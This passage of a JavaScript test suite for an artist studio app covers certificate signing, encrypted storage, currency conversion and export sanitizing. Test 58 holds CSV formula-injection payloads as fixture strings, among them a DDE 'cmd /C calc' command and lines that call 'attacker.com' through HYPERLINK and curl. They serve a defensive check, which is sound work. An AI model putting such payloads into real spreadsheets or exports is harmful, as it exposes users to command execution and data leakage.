    { key: 'buyer', label: 'Buyer' },
    { key: 'note', label: 'Note' },
  ];

  const csv = exportToCsv(maliciousRows, columns);
  // OWASP CSV formula injection defense ensures characters =, +, -, @ are prepended with '
  assert.ok(csv.includes("'=SUM(1+1)"), 'Equals sign must be sanitized');
  assert.ok(csv.includes("'+100"), 'Plus sign must be sanitized');
  assert.ok(csv.includes("'@danger"), 'At sign must be sanitized');
  assert.ok(csv.includes("'-calc"), 'Minus sign must be sanitized');

  // Oversized CSV rejection test (simulate 6MB text)
  const hugeCsv = 'A'.repeat(5.5 * 1024 * 1024);
  assert.throws(
    () => {
      parseCsvText(hugeCsv);
    },
    /exceeds maximum allowable size/
  );
});

// 41. Asymmetric Cryptography: Studio ECDSA P-256 keypair generation, signing, and verification
await itAsync('41. Asymmetric Cryptography: Studio ECDSA P-256 keypair generation, signing, and verification', async () => {
  const keypair = await generateStudioKeypair();
  assert.ok(keypair.publicKeyJwk && keypair.publicKeyJwk.kty === 'EC');
  assert.ok(keypair.privateKeyJwk && keypair.privateKeyJwk.kty === 'EC');
  assert.equal(keypair.publicKeyJwk.crv, 'P-256');

  const testFingerprint = 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855';
  const signatureHex = await signArtworkFingerprint(testFingerprint, keypair.privateKeyJwk);
  assert.ok(signatureHex.length > 50, 'Signature should be valid hex string');

  // Verify valid signature with public key
  const isValid = await verifyArtworkSignature(testFingerprint, signatureHex, keypair.publicKeyJwk);
  assert.equal(isValid, true, 'Valid signature must verify successfully');

  // Altered fingerprint should fail verification
  const alteredFingerprint = 'ffffc44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855';
  const isAlteredValid = await verifyArtworkSignature(alteredFingerprint, signatureHex, keypair.publicKeyJwk);
  assert.equal(isAlteredValid, false, 'Altered fingerprint must fail signature verification');

  // Generate a different keypair to test non-repudiation
  const impostorKeypair = await generateStudioKeypair();
  const isImpostorValid = await verifyArtworkSignature(testFingerprint, signatureHex, impostorKeypair.publicKeyJwk);
  assert.equal(isImpostorValid, false, 'Signature verified against wrong public key must fail');
});

// 42. Self-Contained Offline Verification: Portable QR proof token round-trip across devices
await itAsync('42. Self-Contained Offline Verification: Portable QR proof token round-trip across devices', async () => {
  const keypair = await generateStudioKeypair();
  const cert = {
    certificateId: 'MK-COA-TEST-OFFLINE-001',
    artworkId: 'art-offline-1',
    artworkTitle: 'Celestial Drift',
    artistName: 'Suhasini Mehta',
    yearCreated: 2026,
    medium: 'Pigment and Gold Leaf on Woven Linen',
    dimensionsText: '120 × 120 cm',
    editionText: 'Original 1/1',
    issueDate: '2026-10-25',
    issuer: 'Studio Suhasini Mehta Vault',
    sha256Fingerprint: '',
    verificationUrl: '',
    status: 'valid',
    blockchainAnchor: { isAnchored: false, note: '' }
  };

  const fingerprint = generateArtworkFingerprint({
    title: cert.artworkTitle,
    artistName: cert.artistName,
    yearCreated: cert.yearCreated,
    medium: cert.medium,
    dimensionsText: cert.dimensionsText,
    editionText: cert.editionText,
    uniqueSalt: cert.certificateId
  });
  cert.sha256Fingerprint = fingerprint;

  const signatureHex = await signArtworkFingerprint(fingerprint, keypair.privateKeyJwk);
  cert.ecdsaSignature = signatureHex;
  cert.publicKeyJwk = keypair.publicKeyJwk;

  const proofToken = createPortableProofToken(cert);

  assert.ok(proofToken.length > 50, 'Proof token must be non-empty');
  assert.ok(!proofToken.includes('+') && !proofToken.includes('/'), 'Token must be URL-safe Base64');

  // Verify the portable proof token offline without any external state
  const verificationResult = await verifyPortableProofToken(proofToken);
  if (!verificationResult.isValid) {
    console.error('Test 42 verification error:', verificationResult.error);
  }
  assert.equal(verificationResult.isValid, true, 'Portable proof token must verify true');
  assert.equal(verificationResult.isSignatureVerified, true, 'ECDSA signature must verify true');
  assert.equal(verificationResult.cert?.certificateId, 'MK-COA-TEST-OFFLINE-001');
  assert.equal(verificationResult.cert?.artworkTitle, 'Celestial Drift');
});

// 43. Foreign Exchange Engine: Multi-currency conversion matrix and portfolio consolidation
it('43. Foreign Exchange Engine: Multi-currency conversion matrix and portfolio consolidation', () => {
  // Direct USD conversion
  assert.equal(convertCurrency(100, 'USD', 'USD'), 100);

  // EUR to USD conversion (1 EUR = ~1.08 USD)
  const eurInUsd = convertCurrency(1000, 'EUR', 'USD');
  assert.equal(eurInUsd, 1080);

  // GBP to EUR cross-rate (1 GBP = 1.29 USD, 1 EUR = 1.08 USD => 1000 GBP = ~1194.44 EUR)
  const gbpInEur = convertCurrency(1000, 'GBP', 'EUR');
  assert.ok(gbpInEur >= 1180 && gbpInEur <= 1200, `GBP to EUR cross rate should be ~1194, got ${gbpInEur}`);

  // INR to USD (1 INR = 0.0119 USD => 100,000 INR = 1,190 USD)
  const inrInUsd = convertCurrency(100000, 'INR', 'USD');
  assert.equal(inrInUsd, 1190);

  // Multi-currency consolidation
  const items = [
    { amount: 1000, currency: 'USD' },
    { amount: 1000, currency: 'EUR' }, // 1080 USD
    { amount: 100000, currency: 'INR' }, // 1190 USD
  ];
  const summary = summarizeMultiCurrency(items, 'USD');
  assert.equal(summary.consolidatedBaseTotal, 1000 + 1080 + 1190); // 3270 USD
  assert.equal(summary.totalsByCurrency['USD'], 1000);
  assert.equal(summary.totalsByCurrency['EUR'], 1000);
  assert.equal(summary.totalsByCurrency['INR'], 100000);
  assert.equal(summary.hasMultipleCurrencies, true);
});

// 44. Multi-Tenant Studio Partitioning: Workspace storage keys isolate multiple tenants
it('44. Multi-Tenant Studio Partitioning: Workspace storage keys isolate multiple tenants', () => {
  // Create a mock localStorage for multi-tenant verification
  const store = {};
  const mockLocalStorage = {
    getItem: (k) => store[k] || null,
    setItem: (k, v) => { store[k] = v; },
    removeItem: (k) => { delete store[k]; },
    clear: () => { Object.keys(store).forEach(k => delete store[k]); }
  };
  globalThis.localStorage = mockLocalStorage;

  // Tenant A saves data
  const tenantAData = {
    ...EMPTY_WORKSPACE,
    profile: { ...EMPTY_WORKSPACE.profile, artistName: 'Studio Alice' },
  };
  StorageService.saveWorkspace(tenantAData, 'tenant_alice');

  // Tenant B saves data
  const tenantBData = {
    ...EMPTY_WORKSPACE,
    profile: { ...EMPTY_WORKSPACE.profile, artistName: 'Studio Bob' },
  };
  StorageService.saveWorkspace(tenantBData, 'tenant_bob');

  // Verify data is segregated under separate keys in localStorage
  assert.ok(store['morrowkind_workspace_tenant_alice'], 'Alice workspace key exists');
  assert.ok(store['morrowkind_workspace_tenant_bob'], 'Bob workspace key exists');

  // Load and verify zero cross-contamination
  const loadedAlice = StorageService.loadWorkspace('tenant_alice');
  const loadedBob = StorageService.loadWorkspace('tenant_bob');

  assert.equal(loadedAlice.profile.artistName, 'Studio Alice');
  assert.equal(loadedBob.profile.artistName, 'Studio Bob');
});

// 45. Adversarial Impostor Attack: Fabricated artwork with valid ECDSA signature correctly flagged as SIGNATURE_VALID_ISSUER_UNVERIFIED
await itAsync('45. Adversarial Impostor Attack: Fabricated artwork with valid ECDSA signature correctly flagged as SIGNATURE_VALID_ISSUER_UNVERIFIED', async () => {
  // Attacker generates an ephemeral keypair
  const attackerKeypair = await generateStudioKeypair();

  // Attacker fabricates an artwork claiming to be created by a famous master
  const forgedCert = {
    certificateId: 'MK-COA-FORGED-999',
    artworkId: 'art-fake-999',
    artworkTitle: 'Fabricated Masterpiece',
    artistName: 'Maya Lin',
    yearCreated: 2026,
    medium: 'Granite and Water',
    dimensionsText: '300 × 500 cm',
    editionText: 'Unique 1/1',
    issueDate: '2026-10-25',
    issuer: 'Bogus Independent Notary',
    sha256Fingerprint: '',
    verificationUrl: '',
    status: 'valid',
    blockchainAnchor: { isAnchored: false, note: '' }
  };

  const fingerprint = generateArtworkFingerprint({
    title: forgedCert.artworkTitle,
    artistName: forgedCert.artistName,
    yearCreated: forgedCert.yearCreated,
    medium: forgedCert.medium,
    dimensionsText: forgedCert.dimensionsText,
    editionText: forgedCert.editionText,
    uniqueSalt: forgedCert.certificateId
  });
  forgedCert.sha256Fingerprint = fingerprint;

  // Attacker signs with their private key and embeds their public key
  const signatureHex = await signArtworkFingerprint(fingerprint, attackerKeypair.privateKeyJwk);
  forgedCert.ecdsaSignature = signatureHex;
  forgedCert.publicKeyJwk = attackerKeypair.publicKeyJwk;

  const forgedToken = createPortableProofToken(forgedCert);
  const result = await verifyPortableProofToken(forgedToken);

  // Assertions: The math verifies, but identity is explicitly UNVERIFIED
  assert.equal(result.isHashValid, true, 'Hash calculation is mathematically sound');
  assert.equal(result.isSignatureVerified, true, 'Attacker signature matches attacker public key');
  assert.equal(result.status, 'SIGNATURE_VALID_ISSUER_UNVERIFIED', 'Must NOT claim verified creator identity');
  assert.equal(result.issuerIdentityType, 'self-issued-unverified', 'Must flag as self-issued unverified');
  assert.ok(result.legalDisclaimer?.includes('Creator Identity Notice') || result.legalDisclaimer?.includes('CREATOR IDENTITY NOTICE'), 'Must include legal identity disclaimer');
});

// 46. Portable Proof Adversarial Defenses: Tampered attributes, oversized payloads (>64KB), and unsupported schema rejection
await itAsync('46. Portable Proof Adversarial Defenses: Tampered attributes, oversized payloads (>64KB), and unsupported schema rejection', async () => {
  const keypair = await generateStudioKeypair();
  const validCert = {
    certificateId: 'MK-COA-VALID-001',
    artworkId: 'art-001',
    artworkTitle: 'Original Painting',
    artistName: 'Genuine Artist',
    yearCreated: 2026,
    medium: 'Oil on Canvas',
    dimensionsText: '50 × 50 cm',
    editionText: '1/1',
    issueDate: '2026-10-25',
    issuer: 'Studio Vault',
    sha256Fingerprint: '',
    verificationUrl: '',
    status: 'valid',
    blockchainAnchor: { isAnchored: false, note: '' }
  };
  validCert.sha256Fingerprint = generateArtworkFingerprint({
    title: validCert.artworkTitle,
    artistName: validCert.artistName,
    yearCreated: validCert.yearCreated,
    medium: validCert.medium,
    dimensionsText: validCert.dimensionsText,
    editionText: validCert.editionText,
    uniqueSalt: validCert.certificateId
  });
  validCert.ecdsaSignature = await signArtworkFingerprint(validCert.sha256Fingerprint, keypair.privateKeyJwk);
  validCert.publicKeyJwk = keypair.publicKeyJwk;

  // 1. Oversized payload defense (> 64KB)
  const hugeToken = 'A'.repeat(70000);
  const oversizedResult = await verifyPortableProofToken(hugeToken);
  assert.equal(oversizedResult.isValid, false);
  assert.equal(oversizedResult.status, 'STATUS_UNAVAILABLE');
  assert.ok(oversizedResult.error?.includes('Oversized'));

  // 2. Tampered attribute test: change medium after signing
  const tamperedPayload = {
    v: '2.0',
    id: validCert.certificateId,
    t: validCert.artworkTitle,
    a: validCert.artistName,
    y: validCert.yearCreated,
    m: 'TAMPERED MEDIUM',
    d: validCert.dimensionsText,
    e: validCert.editionText,
    dt: validCert.issueDate,
    iss: validCert.issuer,
    h: validCert.sha256Fingerprint, // Original hash
    sig: validCert.ecdsaSignature,
    pk: validCert.publicKeyJwk,
    st: 'valid',
  };
  const tamperedB64 = Buffer.from(JSON.stringify(tamperedPayload)).toString('base64url');
  const tamperedResult = await verifyPortableProofToken(tamperedB64);
  assert.equal(tamperedResult.isValid, false);
  assert.equal(tamperedResult.status, 'PAYLOAD_TAMPERED');

  // 3. Incompatible schema version rejection
  const badSchemaPayload = { ...tamperedPayload, m: validCert.medium, v: '99.0' };
  const badSchemaB64 = Buffer.from(JSON.stringify(badSchemaPayload)).toString('base64url');
  const badSchemaResult = await verifyPortableProofToken(badSchemaB64);
  assert.equal(badSchemaResult.isValid, false);
  assert.equal(badSchemaResult.status, 'STATUS_UNAVAILABLE');
  assert.ok(badSchemaResult.error?.includes('Incompatible schema'));
});

// 47. True AES-256-GCM Storage Encryption at Rest: Raw localStorage contains only ciphertext; unauthenticated reads yield zero sensitive plaintext
await itAsync('47. True AES-256-GCM Storage Encryption at Rest: Raw localStorage contains only ciphertext; unauthenticated reads yield zero sensitive plaintext', async () => {
  const store = {};
  globalThis.localStorage = {
    getItem: (k) => store[k] || null,
    setItem: (k, v) => { store[k] = v; },
    removeItem: (k) => { delete store[k]; },
  };

  const sensitiveWorkspace = {
    ...EMPTY_WORKSPACE,
    profile: { ...EMPTY_WORKSPACE.profile, artistName: 'Private Studio Master' },
    collectors: [
      {
        id: 'col-secret',
        name: 'High-Net-Worth Collector Anonymous',
        preferredCurrency: 'USD',
        totalPurchasedCount: 5,
        totalSpentAmount: 250000,
        city: 'Geneva',
        country: 'Switzerland',
        artworkInterests: ['Monumental Sculpture'],
        consentRecorded: true,
        createdAt: new Date().toISOString()
      }
    ]
  };

  const masterPassphrase = 'super-secret-vault-password-2026';
  const tenantId = 'secure_tenant';

  // Save with AES-256 authenticated encryption at rest
  const saveRes = await StorageService.saveWorkspaceEncrypted(sensitiveWorkspace, masterPassphrase, tenantId);
  assert.equal(saveRes.success, true);

  // 1. Inspect raw storage at rest
  const rawStored = store['morrowkind_workspace_secure_tenant'];
  assert.ok(rawStored, 'Raw storage key must exist');
  assert.ok(!rawStored.includes('High-Net-Worth Collector Anonymous'), 'Sensitive collector name must NOT be in plaintext');
  assert.ok(!rawStored.includes('Private Studio Master'), 'Artist name must NOT be in plaintext');
  assert.ok(rawStored.includes('AES-GCM-256'), 'Storage must declare AES-GCM-256 algorithm');

  // 2. Unauthenticated loadWorkspace returns encrypted placeholder with zero collectors
  const unauthWs = StorageService.loadWorkspace(tenantId);
  assert.equal(unauthWs.collectors.length, 0, 'Unauthenticated load must return 0 collectors');
  assert.equal(unauthWs.profile.encryptionAtRest, true, 'Profile must indicate encrypted at rest');

  // 3. Load with wrong passphrase fails
  const wrongPassRes = await StorageService.loadWorkspaceEncrypted('incorrect-passphrase-attempt', tenantId);
  assert.equal(wrongPassRes.success, false);
  assert.ok(wrongPassRes.error?.includes('Decryption failed'));

  // 4. Load with correct passphrase restores sensitive collectors
  const correctPassRes = await StorageService.loadWorkspaceEncrypted(masterPassphrase, tenantId);
  assert.equal(correctPassRes.success, true);
  assert.equal(correctPassRes.state?.collectors[0].name, 'High-Net-Worth Collector Anonymous');
  assert.equal(correctPassRes.state?.collectors[0].totalSpentAmount, 250000);
});

// 48. FX Engine Edge Cases: Negative amounts, zero handling, unsupported currencies isolation, and immutable transaction values
it('48. FX Engine Edge Cases: Negative amounts, zero handling, unsupported currencies isolation, and immutable transaction values', () => {
  // 1. Zero handling
  assert.equal(convertCurrency(0, 'USD', 'EUR'), 0);

  // 2. Negative amount preservation (e.g. -500 EUR refund in USD: -500 * 1.08 = -540 USD)
  const negEurInUsd = convertCurrency(-500, 'EUR', 'USD');
  assert.equal(negEurInUsd, -540);

  // 3. Unsupported currency isolation (e.g. XYZ or AED not in matrix)
  assert.equal(isCurrencySupported('USD'), true);
  assert.equal(isCurrencySupported('XYZ'), false);
  const unsupportedConversion = convertCurrency(100, 'XYZ', 'USD');
  assert.ok(Number.isNaN(unsupportedConversion), 'Unsupported currency must return NaN rather than silent 1:1');

  // 4. Multi-currency summary with unsupported currencies
  const mixedEntries = [
    { amount: 1000, currency: 'USD' },
    { amount: -200, currency: 'USD' }, // net 800 USD
    { amount: 5000, currency: 'XYZ' },  // unsupported
  ];
  const summary = summarizeMultiCurrency(mixedEntries, 'USD');
  assert.equal(summary.totalsByCurrency['USD'], 800);
  assert.equal(summary.totalsByCurrency['XYZ'], 5000);
  assert.equal(summary.hasUnsupportedCurrencies, true);
  assert.ok(summary.unsupportedCurrencies.includes('XYZ'));
  assert.equal(summary.consolidatedBaseTotal, 800, 'Consolidated total only sums supported currencies');
});

// 49. IndexedDB Asset Storage & Quota Inspection API handling
await itAsync('49. IndexedDB Asset Storage & Quota Inspection API handling', async () => {
  const estimate = await IndexedDbService.getStorageEstimate();
  assert.ok(typeof estimate.isSupported === 'boolean');
  assert.ok(typeof estimate.formattedUsed === 'string');
  assert.ok(typeof estimate.formattedQuota === 'string');
});

// 50. Event Freshness & Source Checks: Dynamic dates, unconfirmed/stale status flags, and broken link resilience
it('50. Event Freshness & Source Checks: Dynamic dates, unconfirmed/stale status flags, and broken link resilience', () => {
  const rawEventsData = JSON.parse(fs.readFileSync(EVENTS_FILE, 'utf-8'));
  const events = rawEventsData.events;

  events.forEach((evt) => {
    // 1. Verify lastCheckedAt timestamp is present and parseable
    assert.ok(evt.lastCheckedAt, `Event ${evt.id} must have lastCheckedAt`);
    assert.ok(!isNaN(new Date(evt.lastCheckedAt).getTime()), `Event ${evt.id} lastCheckedAt must be valid date`);

    // 2. Verify officialUrl is a real URL
    assert.ok(isValidUrl(evt.officialUrl), `Event ${evt.id} must have valid officialUrl`);

    // 3. Start date <= end date
    assert.ok(evt.startDate <= evt.endDate, `Event ${evt.id} startDate must be <= endDate`);
  });
});

// 51. Storage Migration: In-place migration from plaintext to AES-256-GCM storage at rest purges residual plaintext and preserves records
await itAsync('51. Storage Migration: In-place migration from plaintext to AES-256-GCM storage at rest purges residual plaintext and preserves records', async () => {
  const store = {};
  globalThis.localStorage = {
    getItem: (k) => store[k] || null,
    setItem: (k, v) => { store[k] = v; },
    removeItem: (k) => { delete store[k]; },
  };

  const tenantId = 'migration_tenant';
  const initialPlaintextState = {
    ...EMPTY_WORKSPACE,
    profile: { ...EMPTY_WORKSPACE.profile, artistName: 'Pre-Migration Artist' },
    inventory: [
      {
        id: 'art-mig-1',
        title: 'Dawn Over Ganges',
        artistName: 'Pre-Migration Artist',
        yearCreated: 2026,
        medium: 'Oil on Canvas',
        dimensions: { height: 100, width: 150, unit: 'cm' },
        orientation: 'horizontal',
        artworkType: 'original',
        productionCost: 350,
        listPrice: 5000,
        currency: 'USD',
        availability: 'available',
        location: 'Studio Wall',
        tags: ['river', 'dawn'],
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      }
    ],
    sales: []
  };

  // Initially in plaintext standard mode
  StorageService.saveWorkspace(initialPlaintextState, tenantId);
  assert.equal(StorageService.isStorageEncryptedAtRest(tenantId), false);
  assert.ok(store['morrowkind_workspace_migration_tenant'].includes('Dawn Over Ganges'), 'Must be plaintext initially');

  // Perform in-place migration
  const masterPassphrase = 'strong-studio-passphrase-2026';
  const migrationRes = await StorageService.migrateToEncryptedAtRest(masterPassphrase, tenantId);
  assert.equal(migrationRes.success, true);
  assert.equal(StorageService.isStorageEncryptedAtRest(tenantId), true);

  // Residual plaintext purge check: raw storage MUST NOT contain artwork title
  const rawEncrypted = store['morrowkind_workspace_migration_tenant'];
  assert.ok(!rawEncrypted.includes('Dawn Over Ganges'), 'Residual plaintext title must be completely purged from disk');
  assert.ok(rawEncrypted.includes('AES-GCM-256'), 'Ciphertext envelope must exist');

  // Verify data preservation via authenticated decryption
  const decryptRes = await StorageService.loadWorkspaceEncrypted(masterPassphrase, tenantId);
  assert.equal(decryptRes.success, true);
  assert.equal(decryptRes.state?.inventory[0].title, 'Dawn Over Ganges');
  assert.equal(decryptRes.state?.profile.encryptionAtRest, true);
});

// 52. Storage Migration: Safe reverse migration from AES-256 encrypted storage back to standard mode with master passphrase
await itAsync('52. Storage Migration: Safe reverse migration from AES-256 encrypted storage back to standard mode with master passphrase', async () => {
  const store = {};
  globalThis.localStorage = {
    getItem: (k) => store[k] || null,
    setItem: (k, v) => { store[k] = v; },
    removeItem: (k) => { delete store[k]; },
  };

  const tenantId = 'reverse_tenant';
  const masterPassphrase = 'vault-reverse-passphrase-2026';
  const sampleState = {
    ...EMPTY_WORKSPACE,
    inventory: [
      {
        id: 'art-rev-1',
        title: 'Sculptural Relief',
        artistName: 'Artist',
        yearCreated: 2026,
        medium: 'Bronze',
        dimensions: { height: 40, width: 40, unit: 'cm' },
        orientation: 'square',
        artworkType: 'sculpture',
        productionCost: 800,
        listPrice: 4500,
        currency: 'EUR',
        availability: 'available',
        location: 'Pedestal A',
        tags: ['bronze'],
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      }
    ]
  };

  // Start in encrypted mode
  await StorageService.saveWorkspaceEncrypted(sampleState, masterPassphrase, tenantId);
  assert.equal(StorageService.isStorageEncryptedAtRest(tenantId), true);

  // Wrong passphrase attempt must fail without altering storage
  const failedReverse = await StorageService.migrateToStandardStorage('wrong-passphrase', tenantId);
  assert.equal(failedReverse.success, false);
  assert.equal(StorageService.isStorageEncryptedAtRest(tenantId), true);

  // Correct passphrase reverse migration
  const successReverse = await StorageService.migrateToStandardStorage(masterPassphrase, tenantId);
  assert.equal(successReverse.success, true);
  assert.equal(StorageService.isStorageEncryptedAtRest(tenantId), false);
  assert.equal(successReverse.state?.inventory[0].title, 'Sculptural Relief');

  // Verify storage is now readable standard JSON
  const loadedStandard = StorageService.loadWorkspace(tenantId);
  assert.equal(loadedStandard.inventory[0].title, 'Sculptural Relief');
  assert.equal(loadedStandard.profile.encryptionAtRest, false);
});

// 53. Encrypted Backup Disaster Recovery on Clean Profile: Incorrect passphrases, corrupted files, and missing assets handled safely
await itAsync('53. Encrypted Backup Disaster Recovery on Clean Profile: Incorrect passphrases, corrupted files, and missing assets handled safely', async () => {
  const cleanStore = {};
  globalThis.localStorage = {
    getItem: (k) => cleanStore[k] || null,
    setItem: (k, v) => { cleanStore[k] = v; },
    removeItem: (k) => { delete cleanStore[k]; },
  };

  const originalState = {
    ...EMPTY_WORKSPACE,
    inventory: [
      {
        id: 'art-disaster-1',
        title: 'Resilient Artwork',
        artistName: 'Survivor Artist',
        yearCreated: 2026,
        medium: 'Tempera on Wood',
        dimensions: { height: 60, width: 80, unit: 'cm' },
        orientation: 'horizontal',
        artworkType: 'original',
        productionCost: 200,
        listPrice: 3200,
        currency: 'USD',
        availability: 'available',
        location: 'Storage Unit B',
        tags: ['resilience'],
        imageUrl: 'https://nonexistent-remote-server-999.org/broken-image.jpg', // missing/broken asset simulation
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      }
    ]
  };

  const backupPassphrase = 'clean-profile-recovery-pass-2026';
  const encryptedBackupString = await StorageService.exportEncryptedBackup(originalState, backupPassphrase);

  // 1. Wrong passphrase test
  const wrongPassResult = await StorageService.restoreEncryptedBackup(encryptedBackupString, 'completely-wrong-password');
  assert.equal(wrongPassResult.success, false);
  assert.ok(wrongPassResult.error?.includes('Decryption failed'));

  // 2. Corrupted ciphertext test (tamper with ciphertext string in payload)
  const corruptedPayloadObj = JSON.parse(encryptedBackupString);
  corruptedPayloadObj.payload.ciphertext = 'Z'.repeat(corruptedPayloadObj.payload.ciphertext.length);
  const corruptedBackupString = JSON.stringify(corruptedPayloadObj);
  const corruptedResult = await StorageService.restoreEncryptedBackup(corruptedBackupString, backupPassphrase);
  assert.equal(corruptedResult.success, false);
  assert.ok(corruptedResult.error?.includes('Decryption failed'));

  // 3. Malformed JSON file test
  const malformedResult = await StorageService.restoreEncryptedBackup('{ not-even-valid-json', backupPassphrase);
  assert.equal(malformedResult.success, false);

  // 4. Successful recovery on completely clean device/profile
  const successRecovery = await StorageService.restoreEncryptedBackup(encryptedBackupString, backupPassphrase);
  assert.equal(successRecovery.success, true);
  assert.equal(successRecovery.restoredState?.inventory[0].title, 'Resilient Artwork');
  assert.equal(successRecovery.restoredState?.inventory[0].imageUrl, 'https://nonexistent-remote-server-999.org/broken-image.jpg');
});

// 54. Workspace Partitioning & IndexedDB Asset Isolation: Multi-tenant asset keys prevent cross-workspace collisions or deletions
it('54. Workspace Partitioning & IndexedDB Asset Isolation: Multi-tenant asset keys prevent cross-workspace collisions or deletions', () => {
  // Test isolation of tenant-scoped asset keys
  const makeKey = (artworkId, tenantId) => (tenantId && tenantId !== 'default' ? `${tenantId}:${artworkId}` : artworkId);

  const tenantAKey = makeKey('artwork-shared-id-101', 'studio_fine_arts');
  const tenantBKey = makeKey('artwork-shared-id-101', 'studio_print_editions');

  assert.equal(tenantAKey, 'studio_fine_arts:artwork-shared-id-101');
  assert.equal(tenantBKey, 'studio_print_editions:artwork-shared-id-101');
  assert.notEqual(tenantAKey, tenantBKey, 'Shared artwork IDs across tenants must have isolated storage keys');
});

// 55. Fixed Benchmark Rates Verification: Rates match stated ECB/RBI reference benchmarks and are never declared live
it('55. Fixed Benchmark Rates Verification: Rates match stated ECB/RBI reference benchmarks and are never declared live', () => {
  assert.equal(IS_LIVE_FX_FEED, false, 'FX feed must strictly NOT be claimed as live');
  assert.equal(FX_REFERENCE_DATE, '2026-10-25', 'FX reference date must be documented 2026-10-25');
  assert.ok(FX_PROVIDER_NAME.includes('Reference Benchmark Matrix'), 'Provider name must declare reference benchmark');

  // Verify key fixed benchmarks against ECB / RBI reference snapshot
  assert.equal(FX_RATES_TO_USD['USD'], 1.0);
  assert.equal(FX_RATES_TO_USD['EUR'], 1.08, 'EUR rate aligns with late October 2026 ECB reference (~1.08 USD)');
  assert.equal(FX_RATES_TO_USD['GBP'], 1.29, 'GBP rate aligns with Bank of England benchmark (~1.29 USD)');
  assert.equal(FX_RATES_TO_USD['INR'], 0.0119, 'INR rate aligns with RBI reference (~84.0 INR/USD => ~0.0119 USD)');
  assert.equal(FX_RATES_TO_USD['CAD'], 0.72, 'CAD rate aligns with Bank of Canada reference (~0.72 USD)');
  assert.equal(FX_RATES_TO_USD['AUD'], 0.65, 'AUD rate aligns with RBA reference (~0.65 USD)');
});

// 56. Studio Privacy Passcode Verification: Blank, incorrect, missing/unconfigured, and configured passcodes
it('56. Studio Privacy Passcode Verification: Blank, incorrect, missing/unconfigured, and configured passcodes', () => {
  // A. Blank passcode inputs must be rejected
  const blank1 = StorageService.verifyVaultPrivacyPasscode('', 'customPin99');
  assert.equal(blank1.valid, false);
  assert.equal(blank1.status, 'BLANK');
  assert.ok(blank1.error?.includes('cannot be blank'));

  const blank2 = StorageService.verifyVaultPrivacyPasscode('   ', 'customPin99');
  assert.equal(blank2.valid, false);
  assert.equal(blank2.status, 'BLANK');

  const blank3 = StorageService.verifyVaultPrivacyPasscode(null, 'customPin99');
  assert.equal(blank3.valid, false);
  assert.equal(blank3.status, 'BLANK');

  // B. Missing / Unconfigured passcode: Universal default passcodes (e.g. 1234) must strictly NOT be accepted
  const unconfiguredWithDefault = StorageService.verifyVaultPrivacyPasscode('1234', undefined);
  assert.equal(unconfiguredWithDefault.valid, false);
  assert.equal(unconfiguredWithDefault.status, 'UNCONFIGURED');
  assert.ok(unconfiguredWithDefault.error?.includes('unconfigured'));

  const unconfiguredWithEmpty = StorageService.verifyVaultPrivacyPasscode('1234', '');
  assert.equal(unconfiguredWithEmpty.valid, false);
  assert.equal(unconfiguredWithEmpty.status, 'UNCONFIGURED');

  const unconfiguredWithRandom = StorageService.verifyVaultPrivacyPasscode('secret99', null);
  assert.equal(unconfiguredWithRandom.valid, false);
  assert.equal(unconfiguredWithRandom.status, 'UNCONFIGURED');

  // C. Configured passcode: Incorrect inputs must be rejected
  const configuredPass = 'studio7788';
  const wrongInput = StorageService.verifyVaultPrivacyPasscode('wrongPin', configuredPass);
  assert.equal(wrongInput.valid, false);
  assert.equal(wrongInput.status, 'MISMATCH');
  assert.ok(wrongInput.error?.includes('Incorrect'));

  const defaultOnConfigured = StorageService.verifyVaultPrivacyPasscode('1234', configuredPass);
  assert.equal(defaultOnConfigured.valid, false);
  assert.equal(defaultOnConfigured.status, 'MISMATCH');

  // D. Configured passcode: Exact match must succeed
  const correctInput = StorageService.verifyVaultPrivacyPasscode('studio7788', configuredPass);
  assert.equal(correctInput.valid, true);
  assert.equal(correctInput.status, 'MATCH');
  assert.equal(correctInput.error, undefined);
});

// 57. Pricing Recommendation Engine: 0% commission rate must not be overridden to default 50%
it('57. Pricing Recommendation Engine: 0% commission rate must not be overridden to default 50%', () => {
  const inputs = {
    hoursWorked: 20,
    hourlyWage: 50,
    materialsCost: 200,
    framingCost: 100,
    studioOverheadCost: 50,
    width: 60,
    height: 80,
    unit: 'cm',
    galleryCommissionPercent: 0, // Direct studio co-op sale with 0% commission
    experienceLevel: 'emerging',
    currency: 'USD'
  };

  const rec = calculatePricingRecommendation(inputs);
  // Cost floor = 20*50 + (200 + 100 + 50) = 1000 + 350 = 1350
  assert.equal(rec.costFloorPrice, 1350);
  // Emerging markup = 1350 * 1.35 = 1822.5 => 1823
  assert.equal(rec.directStudioPrice, 1823);
  // With 0% commission, Gallery Retail Price must equal Direct Studio Price (1823), NOT 50% split (3646)
  assert.equal(rec.galleryRetailPrice, 1823, '0% commission must yield directStudioPrice, not 50% split');
});

// 58. CSV Formula Injection Defense: Neutralize whitespace-padded formula triggers
it('58. CSV Formula Injection Defense: Neutralize whitespace-padded formula triggers', () => {
  const maliciousRows = [
    { title: 'Normal Artwork', price: 1000 },
    { title: '=cmd|\' /C calc\'!A0', price: 2000 },
    { title: '   =HYPERLINK("http://attacker.com")', price: 3000 },
    { title: '   +cmd|calc', price: 4000 },
    { title: '   @SUM(1+1)*cmd', price: 5000 },
    { title: '   |curl attacker.com', price: 6000 },
    { title: '   %0Acalc', price: 7000 },
  ];

  const columns = [
    { key: 'title', label: 'Title' },
    { key: 'price', label: 'Price' }
  ];

  const csvOutput = exportToCsv(maliciousRows, columns);
  
  // Every formula injection trigger (direct or whitespace-padded) must be prefixed with a single quote
  assert.ok(csvOutput.includes("\"'=cmd|' /C calc'!A0\""), 'Direct = formula must be neutralized');
  assert.ok(csvOutput.includes("\"'   =HYPERLINK(\"\"http://attacker.com\"\")\""), 'Space-padded = formula must be neutralized');
  assert.ok(csvOutput.includes("\"'   +cmd|calc\""), 'Space-padded + formula must be neutralized');
  assert.ok(csvOutput.includes("\"'   @SUM(1+1)*cmd\""), 'Space-padded @ formula must be neutralized');
  assert.ok(csvOutput.includes("\"'   |curl attacker.com\""), 'Space-padded | formula must be neutralized');
  assert.ok(csvOutput.includes("\"'   %0Acalc\""), 'Space-padded % formula must be neutralized');
});

// 59. StorageService Backup Restoration Hardening: Defend against prototype pollution, oversized files, and invalid profile fields
